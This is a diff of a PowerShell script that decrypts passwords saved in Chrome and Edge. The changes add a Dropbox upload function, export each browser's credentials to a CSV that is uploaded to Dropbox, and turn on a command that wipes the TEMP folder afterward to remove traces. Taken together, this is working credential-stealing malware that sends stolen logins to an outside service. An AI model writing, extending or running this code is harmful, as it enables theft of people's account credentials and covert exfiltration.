@@ -104,6 +104,26 @@ public class CryptoHelper {
 }
 "@ -Language CSharp -ReferencedAssemblies @($BouncyCastlePath, $SystemSecurityDllPath)
 
+function DropBox-Upload {
+
+    [CmdletBinding()]
+    param (
+        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+        [Alias("f")]
+        [string]$SourceFilePath
+    ) 
+
+    $DropBoxAccessToken = "YOUR_DROPBOX_ACCESS_TOKEN"   # Replace with your DropBox Access Token
+    $outputFile = Split-Path $SourceFilePath -leaf
+    $TargetFilePath="/$outputFile"
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $authorization = "Bearer " + $DropBoxAccessToken
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", $authorization)
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
 
 function Get-AESKey {
     param ($BrowserPath)
@@ -140,6 +160,7 @@ function Extract-Passwords {
 
     # Get all profiles (including "Default" and custom profiles)
     $Profiles = Get-ChildItem -Path $BrowserPath -Directory | Where-Object { $_.Name -match "Default|Profile \d+" }
+    $Results = @()
 
     foreach ($Profile in $Profiles) {
         $LoginDB = "$($Profile.FullName)\Login Data"
@@ -185,7 +206,7 @@ function Extract-Passwords {
                 Write-Output "URL: $url"
                 Write-Output "Username: $username"
                 Write-Output "Password: $decryptedPassword"
-                Write-Output "--------------------------------"
+                Write-Output "--------------------------------`n"
 
                 if ($decryptedPassword -and -not $decryptedPassword.StartsWith("[") -and $decryptedPassword -ne "[Invalid password format]") {
                     $Results = $Results + [pscustomobject]@{
@@ -195,7 +216,7 @@ function Extract-Passwords {
                         Username = $username
                         Password = $decryptedPassword
                     }
-                    Write-Output "Stored in results: $username"
+                    Write-Output "Stored in results: $username `n"
                 }
             }
 
@@ -203,17 +224,18 @@ function Extract-Passwords {
             $SQLiteConnection.Close()
         }
     }
+    if ($Results.Count -gt 0) {
+        $CsvPath = "$env:TEMP\$($Profile.Name)-$BrowserName-$(Get-Date -Format dd-MMMM-yyyy_hh-mm-ss)-DecryptedPasswords.csv"
+        $Results | Export-Csv -Path $CsvPath -NoTypeInformation
+        Write-Output "Saved: $CsvPath `n"
+        $CsvPath | DropBox-Upload
+    } else {
+        Write-Output "No decrypted passwords found for $BrowserName browser `n"
+    }
 }
 
-$Results = @()
 Extract-Passwords -BrowserPath $ChromePath -BrowserName "Chrome"
 Extract-Passwords -BrowserPath $EdgePath -BrowserName "Edge"
 
-if ($Results.Count -gt 0) {
-    $Results | Export-Csv -Path "$env:TEMP\DecryptedPasswords.csv" -NoTypeInformation
-} else {
-    Write-Output "No decrypted passwords found."
-}
-
 Start-Sleep -Milliseconds 500
-# Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\*' -Force -Recurse -ErrorAction SilentlyContinue" -NoNewWindow
+Start-Process powershell -ArgumentList "-Command Remove-Item '$env:TEMP\*' -Force -Recurse -ErrorAction SilentlyContinue" -NoNewWindow
